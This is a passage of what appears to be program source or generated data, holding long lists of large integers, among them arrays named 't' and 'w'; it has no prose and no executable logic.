3366680, 125320, 905613, 3862065, 1417986, 3325459, 450863, 2285111, 2177190, 2444182, 1746113, 2154716, 2931227, 2339897, 3499453, 721333, 787164, 3063168, 3662338, 2291666, 830204, 3866674, 2797918, 2136914, 1707162, 1041618, 1620124, 2225352, 429237, 2380555, 1763294, 3853547, 3122862, 3062098, 415242, 776357, 3818489, 2489764, 1096887, 830901, 1564570, 2401505, 1069864, 884623, 1181332, 1572787, 1197257, 1959450, 443907, 3396089, 2490842, 3012087, 2125059, 2187118, 2906743, 14286, 1648350, 2233213, 1593219, 4181966, 1252702, 410119, 493301, 1395313, 243189, 803385, 3771209, 3614748, 9127, 1523907, 1818452, 411528, 1600148, 1571631, 2434551, 2009709, 1094498, 1467100, 498250, 1455344, 326204, 3479743, 4059392, 549688, 3267631, 1306045, 3670452, 3794439, 355869, 3570378, 3495735, 719508, 671307, 3738217, 357059, 1039054, 208449, 1772139, 867671, 3128968, 1886075, 1266478, 1105798, 2720493], [167668, 1289720, 3174145, 2668897, 2245182, 2897324, 3640126, 2970138, 4078275, 2419137, 4069751, 94167, 3984301, 2068362, 3769350, 859984, 2408816, 1180603, 3090993, 1327123, 1258763, 3097289, 2560251, 3135340, 103577, 1285465, 3612221, 3351607, 1286625, 1122392, 3528752, 3444357, 33149, 1018053, 763318, 1836353, 3461496, 3855228, 1041594, 3469574, 2202930, 1741106, 4111819, 3602772, 1674254, 3870425, 2281692, 125083, 329375, 1137666, 872658, 3444891, 1435607, 3884526, 169522, 3047467, 2108953, 1576539, 282492, 1243079, 1317457, 4124534, 22679, 1323809, 4018679, 273005, 2199705, 2272783, 1712388, 1857873, 3457328, 728457, 1851728, 2896802, 2137751, 439048, 3791803, 3108365, 1123629, 386270, 2289199, 3103220, 77624, 1799719, 2824145, 3112980, 3120599, 2127292, 1791982, 2115328, 5728, 2938365, 1354666, 2042325, 2818707, 69255, 3797583, 2956068, 3685438, 771143, 2554169, 1168965, 380827, 3674381, 1518679, 3456856, 1603040, 2163600, 3286187, 169736, 2671130, 1833134, 3933842, 357686, 3066807, 1049899, 1633589, 1459948, 140379, 956836, 2241494, 3373537, 2663704, 2494642, 4162938, 1761052, 1154798, 143167, 1968434, 968040, 4108125, 1983144, 402566, 3168009, 2397234, 165407, 2490927, 3494376, 2719421, 3420239, 2347973, 772947, 3925015, 1865001, 1692526, 3152005, 934142, 2530941, 2706218, 850981, 1670956, 2741854, 874952, 1332041, 661141, 4061133, 867196, 2087801, 413322, 476745, 3898783, 3330627, 581382, 264521, 2371146, 2321678, 4019824, 1899036, 979998, 2378426, 2584368, 560089, 2862208, 4047885, 2373205, 2946203, 3680982, 3569470, 4175512, 2496539, 3997889, 104260, 3986423, 1423123, 3865141, 1802011, 1598598, 4055437, 562082, 2402573, 9057, 2793841, 585195, 3086775, 3439111, 1757371, 966040, 617524, 997351, 1262105, 1098465, 1380446, 2727844, 2973170, 2128900, 3134366, 417561, 103799, 3195484, 2788077, 2893058, 1801432, 1397213, 2294250, 2893825, 495485, 2071385, 3451724, 2761511, 3767310, 3847840, 3509553, 1147951, 1233516, 3229394, 4046506, 3161360, 3252432, 55594, 2218016, 3848289, 3951560, 138048, 2193328, 2771441, 2393652, 3079654, 786272, 2173223, 11030, 959753, 4190129, 626937, 827, 2263436, 1590414, 3088803, 411936, 2035004, 380574, 1588232, 269793, 3678877, 386645, 420241, 490040], [3029012, 2721719, 954227, 924823, 1100366, 984994, 2591997, 3057208, 2078901, 3601676, 3477347, 2674034, 664420, 3513846, 359967, 1724284, 2188176, 3567509, 1569663, 3520234, 2181171, 2844252, 2375557, 985779, 3397484, 822374, 2022712, 877524, 2426153, 3246594, 2385394, 1800921, 355470, 2951632, 1131969, 3306766, 1009764, 2194654, 93249, 3690590, 3993452, 215923, 1124537, 3866113, 455368, 3674700, 410825, 2489942, 472138, 4104028, 3339215, 1187367, 774212, 1813788, 4137955, 2441500, 1904066, 2578791, 3265194, 1770403, 163841, 3267071, 2368114, 2419581, 2001327, 4119950, 494615, 3513622, 2956011, 2900225, 2587497, 2334424, 853816, 1531361, 462464, 1328729, 3232162, 710000, 1630985, 3071446, 2579204, 3551435, 1246150, 1092794, 3646383, 1249919, 4058233, 360058, 502274, 1443697, 3773173, 496671, 778022, 1558045, 172726, 2421755, 3960312, 2810668, 2624231, 3305225, 1442392, 693098, 1635660, 490834, 2036558, 2558660, 3147683, 3019435, 2764197, 2812926, 597255, 2902196, 1278295, 2482549, 2219481, 1421516, 1447100, 336944, 2842183, 997753, 3997271, 1278494, 2885302, 1940531, 892299, 2050323, 2006867, 407335, 3396366, 62447, 310780, 519346, 1228769, 719556, 591551, 2873305, 4157228, 2945783, 832937, 1169859, 3093036, 2652704, 4105902, 3588048, 3723885, 812958, 598977, 3957712, 3937877, 3241622, 3262850, 2058086, 952889, 3543756, 4164307, 1885075, 995478, 3926814, 2877205, 1498254, 3915080, 918674, 3659279, 1316688, 3496721, 1128779, 3945497, 2213500, 3731377, 1803046, 1098932, 1777216, 1091749, 1520495, 1293012, 2383411, 864545, 1730373, 2416896, 1689520, 3710006, 3024333, 444400, 2089690, 1590195, 3424540, 628327, 3889648, 1921615, 3157730, 3453796, 2953599, 1008697, 3460041, 3072033, 1935201, 377654, 526468, 933138, 3845911, 926765, 2847447, 373831, 3949739, 1747295, 1280976, 2804158, 449938, 3273986, 555615, 600262, 3771802, 3635444, 1986004, 4097632, 1562648, 3723256, 2685946, 2675661, 454546, 655002, 3311240, 4162368, 2066048, 3327501, 2962394, 2402405, 3749452, 1218733, 1379603, 2803432, 702227, 1900601, 193216, 2725686, 187800, 474047, 760039, 1511791, 3043015, 380786, 2528682, 1278388, 2028801, 300572, 3800688, 2770454, 1832087, 1837780, 3250812, 2979390, 3383983, 1346351, 1320939, 3462186, 3295533], [3489183, 1374142, 2469988, 3433390, 3638060, 2489435, 2751842, 3647546, 3367334, 3730123, 482012, 1854858, 3387727, 2934202, 1034901, 1312295, 661139, 3459046, 1427567, 172882, 555548, 3759653, 1481052, 1884205, 3080521, 2247713, 94338, 2498252, 1081677, 3533321, 2819706, 1610114, 1293328, 3460638, 3056840, 3357409, 2702337, 762026, 1328796, 155973, 3054451, 3275154, 1198314, 2521130, 2851630, 1728674, 648667, 4059544, 1925534, 3718941, 687565, 3528548, 2276328, 3786120, 2268598, 233091, 805193, 2464186, 172397, 531304, 2237043, 158486, 544702, 3108917, 3260956, 973605, 2881421, 3958801, 694431, 1515068, 3358015, 2303215, 3747287, 1561177, 2341801, 1846910, 2879932, 3247922, 1777899, 3016365, 3962305, 3357602, 2185010, 2797176, 2228778, 4054130, 3268076, 3363232, 1782908, 1746348, 2524262, 1688493, 3710630, 4163073, 132440, 3354237, 1097039, 4125465, 26828, 2573237, 2578873, 1167783, 1851487, 3376396, 4127444, 3299267, 424644, 920047, 2659194, 926630, 2318450, 2755057, 2281924, 3838156, 3117124, 2095123, 1086790, 627423, 1718312, 3915260, 2387002, 254061, 2467137, 1174121, 1176100, 168053, 4081883, 3569752, 3024888, 3833669, 1558951, 397941, 3572957, 2734188, 2794317, 205142, 3450829, 3758769, 2007721, 3714167, 2071098, 443569, 76403, 1456658, 499402, 2072442, 2085952, 3885525, 375696, 167036, 3021883, 2436988, 693878, 2586967, 1771420, 155976, 3778276, 9841, 1280570, 2438811, 103331, 91305, 2982642, 3795319, 1373430, 3619907, 2074381, 2382426, 3626795, 2823938, 1576942, 2260944, 1147495, 3292153, 1648924, 3429440, 3497201, 3148252, 72576, 2210295, 360695, 445685, 3121856, 2787472, 956200, 3471708, 2129522, 3588998, 4168994, 3750647, 1140467, 1330624, 2515053, 1356859, 132777, 3889248, 3016254, 2930911, 3036553, 3008514, 805829, 1823972, 2417205, 40163, 427838, 275768, 2411726, 2564478, 803219, 3750473, 1705194, 3938126, 384403, 1481724, 2511973, 1129918, 2346095, 1185637, 478755, 1469922, 2469058, 2505511, 2337489, 1448563, 1688038, 2619067, 2365761, 1988227, 514037, 1743335, 1553698, 3988991, 3556119, 2838162, 1757431, 776305, 2454807, 1620749, 512780, 1937991, 2759017, 393282, 3618303, 3833423, 766773, 2504621, 2916171, 2589668, 2952330, 4189311, 462372, 933967, 506649, 2317443, 1667728, 3097642], [3972687, 486877, 1568525, 961462, 3730649, 1306480, 2969552, 1842604, 954640, 196677, 2646774, 1851953, 3369255, 930607, 1130202, 781357, 2159314, 3707579, 3734258, 2192625, 1376919, 2078763, 852802, 2338689, 1774700, 1788030, 1568134, 1239842, 2855210, 2718174, 4082027, 1386564, 3850201, 3302615, 678461, 2899747, 3595182, 640621, 696118, 4170592, 1905778, 2965909, 1599315, 2510312, 934381, 1499590, 3193706, 1092846, 3976247, 2360995, 852573, 2365491, 427301, 3080890, 1308735, 2592322, 241620, 2354264, 58519, 1581551, 1096616, 3023123, 3640594, 3370762, 3320533, 1034146, 1683487, 890339, 365097, 2869338, 3323263, 1263863, 415819, 890462, 2424491, 1101566, 3462093, 825966, 3441461, 2572436, 3915884, 1638626, 2804079, 3438696, 509929, 1913776, 2311895, 349518, 1403890, 3599421, 2928714, 2730742, 475683, 3146078, 852634, 1142514, 1442486, 3311880, 870473, 3836653, 2188088, 3739062, 153094, 1785423, 4129344, 3695930, 3164688, 798304, 486100, 1264670, 2634936, 1176589, 1631748, 2647328, 1177997, 3797542, 2769222, 2740489, 3535011, 2152079, 3967785, 2136275, 3847116, 2633990, 1718015, 3493688, 1858862, 589283, 1977200, 4183205, 474647, 428493, 170775, 248309, 692801, 361108, 3486426, 2843901, 951315, 3629538, 1215760, 486279, 4024220, 208822, 2614612, 883766, 1369757, 1116638, 3255498, 2582766, 3283698, 3626097, 98212, 754823, 1413317, 1836689, 866612, 3309236, 21743, 654312, 2069542, 1190561, 2247165, 3420978, 2403108, 755536, 742203, 1758681, 3286802, 4137159, 535943, 468027, 1716849, 2584374, 3300776, 519946, 803666, 3865491, 2313911, 3423372, 1730081, 2856185, 3575891, 2502823, 596185, 3433009, 3268527, 691355, 59878, 322304, 2914479, 685631, 1227742, 3660460, 3327529, 4081432, 2006089, 3389912, 1453827, 1291704, 423258, 2470468, 439813, 2304516, 3120296, 4037107, 2940563, 317797, 2955555, 3657381, 2734875, 73702, 205687, 3894053, 1227298, 3089271, 993917, 3856859, 2410596, 2543224, 3040824, 1780691, 3460908, 4152576, 2874345, 2302487, 1620862, 2223761, 577190, 2099705, 2922524, 2649338, 1464143, 419718, 3721964, 1595729, 628798, 1170183, 219368, 963520, 3577809, 1515081, 3593498, 4131915, 2176455, 190015, 626849, 2909607, 2855869, 3429534, 3288043, 3428650, 377684, 1973226, 938801, 2228272], [3481382, 389351, 3686607, 1128326, 2911675, 54904, 1935424, 2524027, 478438, 426811, 860212, 1964144, 1519374, 2692101, 4040200, 4045493, 2136791, 2512694, 262353, 1910754, 2264170, 3787600, 2756622, 701225, 104890, 3084817, 2506216, 430453, 1927860, 1417502, 2495228, 3031115, 1601104, 501700, 2037665, 3432618, 161832, 3890249, 3068166, 4091593, 598486, 3412989, 3104812, 252001, 1483163, 3860763, 497386, 3634242, 3586228, 3070564, 2761934, 2470072, 1677527, 1801581, 2379203, 2807482, 332699, 999587, 3268282, 317850, 1761690, 515519, 11862, 2846165, 2155835, 1403970, 2273682, 61462, 1910657, 306583, 2300650, 1402948, 3369219, 2647311, 932763, 3523741, 629396, 3421387, 886346, 3530009, 1220028, 3706634, 3154869, 1505271, 2942571, 863153, 2262459, 1399828, 2545645, 1211000, 963282, 3147777, 804715, 2198996, 3990398, 3492534, 3083544, 1817546, 1379178, 2758427, 2593584, 3363050, 1908887, 414159, 3851037, 2096048, 700062, 3450220, 3741299, 3622330, 858956, 3969805, 494275, 3968344, 2420022, 26505, 2381617, 2809794, 1624245, 4152226, 1122609, 2442691, 1879490, 1892593, 2591173, 2318522, 639510, 1090989, 4164447, 3595751, 1512792, 1316982, 3728702, 1638192, 234530, 4188094, 2331253, 1985398, 384088, 4155718, 3019170, 2875572, 1979450, 3371682, 4003577, 1066365, 3577320, 3794799, 504708, 1369179, 2844629, 3000048, 3291724, 1762896, 1015150, 2253933, 1971260, 3026209, 2881069, 1682699, 2727070, 923036, 3712127, 2623594, 2587648, 2977751, 2369428, 559930, 419073, 2476159, 1540075, 1978980, 2811457, 3312790, 2869173, 1084391, 3636701, 1280221, 416088, 2195443, 3542185, 4032364, 3084801, 1312009, 590997, 512216, 178063, 63260, 954391, 3824695, 1737840, 2481006, 363436, 2167466, 2966608, 2561400, 2310157, 2906824, 2831349, 184093, 3215589, 1553227, 3391570, 3688012, 1388747, 467092, 75300, 1684105, 761837, 258716, 2029245, 568033, 4118473, 2083221, 638292, 1579792, 3668434, 2928392, 1042443, 970082, 1215727, 586695, 4020403, 2538739, 3387513, 412417, 851529, 2102255, 3473280, 978160, 218164, 1892719, 3624150, 649310, 1808749, 1193872, 961054, 3743546, 3708344, 4023509, 85612, 975313, 1182614, 635701, 3949737, 899572, 718143, 472057, 472746, 2305398, 2316265, 582894, 1223849, 221439, 2802590, 1355913], [2133763, 3926850, 2319726, 1118165, 1793031, 1816741, 876686, 1498057, 1293956, 2716933, 140454, 2740392, 117324, 2507505, 2104510, 3130545, 854554, 2512963, 3854261, 3089890, 1695571, 3729088, 2358234, 1243280, 3067612, 3277954, 1935739, 465047, 1597805, 4045859, 214037, 2810713, 2032520, 3436121, 2351080, 1068630, 851289, 1995291, 1937641, 2530762, 765856, 1834412, 1000488, 3151749, 3236836, 495689, 2861429, 2954452, 116773, 3862576, 2226203, 2288441, 4079215, 132915, 351761, 1758933, 1870013, 4024384, 3852590, 2764845, 2297073, 3573042, 3562125, 134096, 1735054, 1260371, 4194444, 2316472, 2424732, 3106739, 3969163, 3513872, 390071, 2491094, 3549400, 3784991, 1222914, 743328, 3785026, 2239223, 2639813, 4187689, 262633, 2748843, 4156639, 3612433, 3725120, 2601806, 1028582, 18789, 1857505, 2605977, 99053, 3603447, 2615096, 3853009, 3788650, 2978777, 1804122, 2698663, 1825770, 3237951, 2246608, 2880484, 3597196, 1572436, 1672259, 732125, 1095041, 4046644, 2274609, 441007, 699040, 609468, 1543328, 2478082, 2389854, 1398583, 600543, 2575830, 3464787, 1427507, 2356950, 1640399, 2070476, 3244196, 4152370, 3293490, 582122, 4115914, 3227016, 1166552, 3743072, 988754, 389104, 2924560, 3738279, 1723263, 720447, 1798837, 2042181, 3324692, 1978960, 2597180, 3118808, 2431658, 3602387, 3010924, 327692, 615190, 4170587, 771339, 3969744, 2332550, 3311954, 3850914, 2639910, 1354160, 1821294, 4011602, 779888, 3776968, 198748, 560578, 3002810, 474526, 1303532, 3506867, 3196876, 3160024, 1606713, 3856242, 2177675, 2957720, 772418, 3237680, 801616, 2197048, 2861696, 137425, 1098261, 3549357, 1826909, 1836705, 326718, 1218932, 273832, 659150, 3059254, 610905, 2321962, 711754, 1063644, 225658, 1966261, 626414, 2605792, 957110, 2152381, 3438956, 2120361, 100193, 1716281, 908444, 2198361, 796858, 2263546, 567762, 1827534, 790409, 2217591, 3259032, 3645556, 846201, 4166886, 3785356, 423950, 372340, 873794, 2830962, 601398, 1818263, 322865, 3227279, 2414717, 1447571, 2771801, 578666, 3244541, 849641, 1727019, 3144724, 2239473, 1585829, 3576802, 3297456, 3623331, 3474552, 607104, 3256108, 355834, 1028371, 3443026, 1199189, 4112002, 3172478, 860086, 1129468, 3092532, 3981879, 3972137, 102166, 3096242, 388936, 3317427, 3701010], [1193398, 1712285, 819674, 1742352, 1402046, 2970648, 613600, 1177288, 1708410, 1043108, 3684543, 1411343, 3703812, 1653072, 1773691, 1932939, 3762840, 409767, 2922580, 1717641, 1687609, 1221524, 2410483, 592660, 218387, 3623436, 1654095, 302976, 29489, 1939556, 1310186, 485512, 3461511, 2412552, 1532873, 4118081, 68400, 1464432, 723640, 2729274, 2312553, 332131, 1416684, 856778, 2774411, 382493, 3750632, 3741565, 3497468, 985709, 282316, 4092674, 3869928, 3625057, 2443782, 3067091, 3310039, 616990, 4108058, 1077557, 3587807, 3051246, 3373847, 191524, 780919, 637769, 3230189, 951758, 959683, 2083107, 1582007, 3260063, 1202175, 6790, 3433130, 3400730, 832279, 3467270, 577613, 322377, 3324104, 1614579, 2469650, 2436042, 3424757, 2371868, 826063, 3744078, 3865660, 3925350, 414791, 2168613, 740941, 3098531, 1539674, 2690373, 2600713, 1121081, 1594137, 465578, 2710108, 3314500, 111974, 202494, 828046, 806165, 688226, 3784123, 2580013, 3243201, 885815, 4158070, 57993, 3668634, 902572, 1045154, 951533, 3102077, 1285430, 829214, 3762279, 367123, 718524, 3530716, 180433, 200045, 3464286, 4184858, 865256, 1315964, 2392854, 1933051, 1096552, 2858535, 1627059, 523799, 2281451, 1704422, 2351782, 4172223, 4114301, 2919865, 3340100, 2921206, 3839062, 1109487, 2373597, 945622, 519709, 2910484, 2094140, 761124, 304456, 1139076, 535255, 3025194, 2805613, 4050463, 2773106, 702664, 468602, 3375830, 709463, 3548485, 649726, 1549328, 3237224, 1363514, 855150, 1634267, 340431, 1748187, 71326, 1285441, 3792727, 2406050, 806082, 893845, 153501, 3962025, 117952, 467606, 3586396, 3651690, 1709779, 3089898, 2946650, 3869240, 2387923, 2682823, 2003260, 395901, 1791397, 1830577, 976306, 62255, 761264, 52891, 1711393, 2001355, 3937031, 2392172, 2985418, 4046378, 1137477, 2129167, 3458988, 31687, 1552299, 1869766, 1533425, 1646294, 3359925, 3344202, 1307074, 1370151, 3969457, 2964880, 2001770, 1079921, 1053900, 3958167, 287277, 3946278, 2102513, 927002, 485914, 3158133, 1830801, 2293823, 1183919, 2920983, 1141229, 2529070, 1525183, 3666673, 6688, 2428538, 839330, 83778, 2498793, 800287, 3003237, 2401311, 2115215, 1364739, 2299608, 2733644, 221403, 3181436, 1367779, 1841630, 2741551, 1125109, 2660017, 4188255], [4170189, 4197458, 1708071, 2064659, 3089237, 4056506, 3161629, 3664990, 1944620, 2094143, 121306, 1194110, 1240892, 3099568, 3993621, 1091746, 701654, 3448318, 3814174, 1126917, 1638551, 795328, 1062966, 1079651, 1627935, 997385, 2350913, 2573664, 2906798, 927205, 3324125, 2544332, 2951786, 1053942, 1454063, 2887437, 923855, 1196730, 3964676, 1709181, 3658799, 1761044, 2467567, 4015863, 3330, 3149670, 861304, 679243, 761073, 2444773, 3485706, 3681222, 3669115, 2318964, 2356112, 1277375, 3539523, 660331, 3366417, 3992799, 2959508, 4174193, 1233604, 1785685, 3599346, 3812237, 4114839, 1829108, 128707, 2718214, 1912069, 1890882, 346864, 2305065, 3662290, 878154, 4191330, 788322, 1202968, 42601, 2115783, 293042, 2608753, 2386993, 1976325, 3721821, 2478763, 2550290, 505715, 3094954, 1979897, 2094643, 2982289, 1759081, 2167879, 490701, 135534, 2572034, 2490451, 2505654, 634878, 689, 2356360, 2725060, 3289272, 343797, 376122, 3218370, 1119404, 1870153, 842846, 3388014, 955738, 367358, 2094687, 3477244, 3623175, 879292, 228275, 1484429, 2810235, 2814709, 2541814, 1193688, 2881402, 1019594, 1522732, 996253, 1084197, 367507, 3717724, 3207119, 1790442, 2389328, 806574, 1997523, 2652436, 905052, 3262059, 4149216, 401917, 3711601, 3952142, 398990, 218324, 631452, 928133, 4459, 725212, 2052229, 1243421, 3306317, 3720210, 3276054, 2910991, 434782, 395218, 1470340, 573225, 2390273, 296626, 2756391, 2710908, 2203254, 767936, 1124989, 1947868, 1572917, 923291, 1249714, 142676, 2912044, 1422779, 3042156, 1443846, 1902050, 241191, 148498, 430765, 1993542, 3230636, 2343623, 4008914, 2366216, 3685554, 3149250, 2814424, 2544973, 1524706, 3713148, 3773273, 2004733, 244814, 266374, 2130359, 1112303, 405474, 1072385, 2998060, 263845, 1972766, 3484334, 2849352, 2783213, 2013716, 1880600, 1948680, 1266642, 3182060, 2797565, 2121673, 210066, 3311577, 443042, 483449, 549420, 2010948, 20615, 2843428, 2879138, 816267, 1860567, 3052149, 1145492, 3495049, 1886830, 3663633, 2804270, 2736028, 2015025, 2089071, 3207450, 627952, 1100512, 2278360, 85878, 2898776, 422416, 1616950, 3429318, 3833266, 362203, 2705348, 3381985, 1735489, 2574767, 3892613, 771610, 1407521, 1405588, 3939312, 521804, 3302586, 2913615, 2560681, 1277301], [205414, 2580614, 3261531, 4086404, 2545455, 13592, 2105063, 328717, 231975, 3605147, 763756, 683099, 587024, 1787003, 934636, 1627658, 56436, 2400368, 2014236, 3010666, 367595, 470110, 1652083, 3771756, 870644, 1203111, 2745393, 2124694, 3659560, 1376375, 3596488, 321652, 502094, 1948053, 277274, 30072, 3915236, 1132605, 3488579, 694197, 3587441, 116081, 3551925, 3339063, 980571, 1017141, 1172356, 2479285, 2382140, 1637799, 179978, 3457977, 4078828, 797369, 2398562, 287214, 3611353, 2674229, 363609, 1643898, 3834098, 3095178, 2278377, 2925969, 2912060, 1622528, 1674336, 3585480, 1063206, 4062022, 2524612, 3875654, 349402, 1874061, 42477, 1696726, 3386773, 3384104, 3056446, 3628852, 2495953, 1186419, 3485283, 4188949, 400831, 4184628, 2303759, 900060, 1295431, 3661490, 2013856, 2464642, 2413900, 2425288, 3338119, 2627464, 2709200, 3539840, 846061, 3027866, 2319072, 2504618, 3598713, 3735931, 3852205, 2665622, 4157227, 1968045, 610859, 1274625, 2974802, 3764987, 2902343, 1891454, 3915260, 1396350, 1015650, 2670513, 2353140, 2372566, 1499179, 931690, 455584, 3345473, 3288538, 2549767, 1888527, 289981, 3667839, 781825, 728650, 2912777, 2936431, 1548715, 2955614, 2510836, 2794501, 3038390, 1253596, 1703432, 731462, 257895, 3727703, 3589492, 2950279, 2727767, 3430362, 1844411, 541925, 3553424, 278296, 1165271, 4194616, 2144149, 641534, 99837, 4179698, 112721, 3187807, 2272858, 4050385, 2905076, 2539739, 4100283, 3142372, 3199912, 1420626, 3166465, 3396298, 1529564, 2854434, 751627, 3962125, 2657338, 569861, 2687706, 2494725, 1397507, 2599673, 484358, 756616, 775087, 3410400, 4164488, 1502452, 3342739, 1423358, 387446, 2355609, 1805051, 1165011, 2196021, 2641948, 2239794, 3608342, 3164087, 3340875, 2652263, 1257756, 1493047, 2187775, 3179420, 1725608, 231211, 2211906, 2499531, 833852, 1917818, 1490344, 3396427, 55102, 3347338, 875844, 2644068, 1134763, 1361233, 480403, 2773431, 4072578, 1539557, 2270627, 287580, 2148907, 3842875, 2804202, 1355876, 3680617, 969977, 345366, 1294996, 3984075, 3135398, 1805147, 3076561, 1741086, 4113411, 3337436, 1165325, 3674981, 1289055, 98026, 1289758, 1089064, 3327332, 2943372, 4180342, 2677011, 3933879, 3109428, 2246725, 1544027, 1933547, 1640025, 3413058, 1654501, 1392204], [1403276, 4025775, 3795417, 4081540, 238628, 1160540, 585887, 2185505, 2717255, 1224993, 1640865, 2022446, 2405283, 745242, 1366560, 2651990, 1052107, 2974185, 2557322, 1537924, 951949, 1150386, 248725, 819894, 2617226, 946317, 917246, 2394315, 2151911, 115340, 4003967, 1015858, 1822142, 1138019, 3805228, 3383516, 1571073, 2694088, 3739053, 1760121, 275856, 843200, 3891433, 3691449, 304628, 3810710, 2538296, 3969887, 1011295, 692408, 3528336, 1465521, 1584620, 1258351, 3886573, 3432042, 3839893, 2719732, 2424896, 360633, 2944409, 2745533, 2116932, 3474611, 4085182, 268015, 2084690, 786461, 1221322, 3112597, 1239234, 2355440, 311453, 1448410, 2629528, 2883728, 1161535, 4065924, 1386816, 3214266, 1556218, 1295062, 3977403, 3938763, 1364764, 3606426, 3381239, 3089433, 2366511, 889868, 2313457, 929196, 3915746, 3178783, 261989, 569122, 3108374, 1269289, 2106123, 1144397, 3325926, 3179535, 3892214, 1795934, 3088414, 1492558, 2040563, 3103415, 3557125, 3202072, 705739, 4192283, 2054590, 2894320, 1290352, 4172969, 584348, 779436, 2036737, 3749881, 2018312, 3000181, 46429, 732100, 1476962, 3790924, 1004811, 1774427, 383672, 1543971, 321699, 2894565, 1097546, 2130054, 1526842, 3800373, 336041, 3232784, 429846, 2480245, 1724743, 3461385, 1852269, 4135230, 3500473, 1643830, 2549816, 681574, 3779407, 3742074, 4095566, 1677875, 1164977, 2287118, 2175905, 1135254, 1999187, 3112923, 3333821, 2250491, 1637877, 3009932, 2198297, 1259081, 2081206, 4146342, 2263333, 2497064, 3085161, 1513818, 2000812, 3322649, 168090, 2192966, 1096099, 187189, 618833, 877372, 3421028, 2777702, 1940837, 2153879, 1216408, 2633673, 869727, 1211646, 2743414, 332686, 2443069, 3694363, 2747063, 3104571, 3893245, 2152866, 3455924, 2581924, 1608388, 2299122, 447896, 1941319, 1645369, 4076258, 664157, 57554, 446684, 610841, 4109241, 747947, 4187967, 3832635, 3956913, 1023556, 3968652, 1627572, 1295544, 1037279, 2207024, 3848527, 407235, 79844, 1614524, 3611704, 3568439, 685501, 866356, 339424, 1631800, 3128606, 1862277, 1087131, 1576142, 394140, 1966113, 3236165, 2127481, 2524560, 3760972, 1053423, 185207, 2017650, 4023626, 1728574, 1395136, 975618, 188254, 1066083, 4105676, 2427107, 337149, 3304300, 896473, 793852, 3429884, 2482979, 1846770, 579482]]t = [354478, 296332, 177939, 150605, 1407926, 2937274, 2176898, 3305130, 1109682, 2506399, 3202175, 1958626, 4079145, 1332613, 3252888, 3006637, 3335186, 3043191, 1662926, 2370415, 2390448, 2706106, 1792585, 937694, 1611809, 1849167, 2991931, 1175846, 4066762, 2615264, 970706, 3512162, 4119196, 513461, 1929695, 3908567, 24644, 4007676, 3350175, 27550, 1719495, 3229486, 3450221, 2908009, 2188820, 1792744, 272159, 1668710, 1915594, 2776703, 2886677, 2545470, 384996, 415675, 4028270, 733233, 65655, 3239350, 3107739, 2640962, 3097292, 1062856, 1661958, 2225521, 3957998, 98911, 2867531, 168595, 3998931, 397582, 232861, 381014, 3580153, 384445, 701936, 1074835, 3719143, 1950855, 1013482, 1502755, 779686, 3335310, 318780, 4189135, 3046460, 1937175, 3616334, 2991709, 1015898, 390386, 3235502, 4074020, 1777501, 2348745, 1299478, 858335, 1393650, 1941905, 2044081, 1651765, 1081521, 3042439, 2475462, 2155001, 4090269, 2117008, 2838837, 732905, 1417813, 3042, 1451853, 2980425, 1138885, 1307018, 3839883, 2401337, 3326733, 213715, 351410, 1296290, 3277270, 4058870, 437349, 3785513, 3482525, 3350271, 3123322, 1154081, 2660613, 1589095, 2143998, 1520224, 3732559, 4122336, 3906020, 2232955, 27568, 864829, 249061, 3754594, 199817, 1080629, 1688587, 3021918, 85346, 1734200, 2223663, 2357922, 724161, 3736990, 2261910, 3390396, 2948525, 1295901, 2576003, 2560019, 2746610, 2343974, 2446304, 1042150, 3500136, 213270, 2074273, 2478542, 1041559, 520262, 3893712, 3711890, 350959, 3256975, 3401444, 2398124, 3762883, 2928821, 1353277, 1128049, 1658032, 1664240, 1775167, 9320, 223085, 2964848, 3769019, 2986481, 2602091, 1867009, 2010950, 2917513, 485038, 4108141, 2758008, 3326512, 906575, 656526, 3768, 3259747, 870034, 26510, 3897304, 3776840, 2271692, 1446145, 324840, 3915722, 2938429, 831560, 1002372, 3931665, 3164196, 3900054, 1549288, 1293344, 4110122, 3378944, 3263160, 1822736, 1570556, 3585711, 3910733, 1267663, 1430694, 3074956, 2349730, 49045, 3618783, 104834, 3469400, 500062, 1027867, 1903697, 3631085, 763524, 1403697, 1000443, 3849084, 4090704, 3781938, 63386, 2161110, 3145566, 1581532, 3449870, 1828219, 4034598, 407085, 1569954, 2191973, 242689, 3151009, 533414, 3108431, 2438566, 307227, 1611173, 78926, 2467239]w = [148126, 868354, 2143965, 1356121, 1769070, 2215173, 767953, 2601190, 1809380, 334743, 1059282, 1337866, 2591601, 4042346, 919731, 3362618, 2854566, 1414100, 2932551, 227531, 2713508, 230418, 3005563, 1760719, 536916, 1568397, 3319693, 3570057, 1863904, 1526172, 2622540, 2842511, 929697, 801598, 3805675, 3265586, 3604383, 1468136, 3999601, 2691008, 2996784, 2976853, 1437899, 2514953, 3394627, 4024905, 3227570, 3128156, 4055260, 3719706, 1875806, 2908724, 2345332, 2112583, 16315, 367194, 1605308, 2117060, 3176371, 2432272, 3045173, 3703363, 2264317, 4142685, 2318330, 4117388, 498862, 2919276, 3037612, 1891502, 3875694, 3152040, 531307, 3924428, 3655995, 4027669, 1241885, 2052122, 736953, 3689724, 503599, 1457497, 4114661, 1636903, 4191661, 324352, 3565858, 3367778, 1304255, 3849140, 4024435, 2044544, 3176857, 1576867, 2097225, 2798358, 3785400, 2709040, 3039758, 3168651, 1037116, 420753, 1312584, 3894413, 3497233, 1589033, 1636067, 3304973, 1569472, 1703302, 3337749, 1896482, 2716387, 2979425, 1057645, 2574697, 2381132, 37784, 4037898, 2235077, 1875418, 412228, 3388966, 543903, 2077344, 371740, 3730530, 4134854, 3698735, 331270, 2590936, 1907844, 2643932, 14020, 750756, 943297, 416152, 409384, 112714, 639305, 1330651, 2691724, 850667, 3224279, 58695, 1740604, 3205311, 2534600, 1928817, 1606980, 19452, 2590457, 1861232, 2738921, 1887047, 375647, 933170, 116752, 2718275, 3512157, 3274368, 1990859, 3008852, 1038390, 3471575, 3087028, 2271594, 2859626, 2959079, 3489980, 629344, 4119616, 764468, 3535051, 2466424, 2772275, 2490825, 1666917, 3042084, 4134097, 2736933, 3393706, 3600479, 2766691, 1016076, 2292766, 762445, 2425542, 2123813, 2457304, 2455905, 3084655, 2057776, 1896178, 966110, 3198662, 2499316, 3730072, 2103066, 2572639, 2952658, 402245, 1240536, 511529, 1562481, 2830782, 3625253, 2799310, 2921345, 2436157, 2891482, 4187071, 1858478, 2663235, 2407985, 4116422, 2893, 752343, 3404680, 3297905, 1980178, 3974801, 3339179, 1470992, 3549645, 769178, 2345597, 3104728, 2018656, 689899, 2165792, 1274418, 1853479, 3409514, 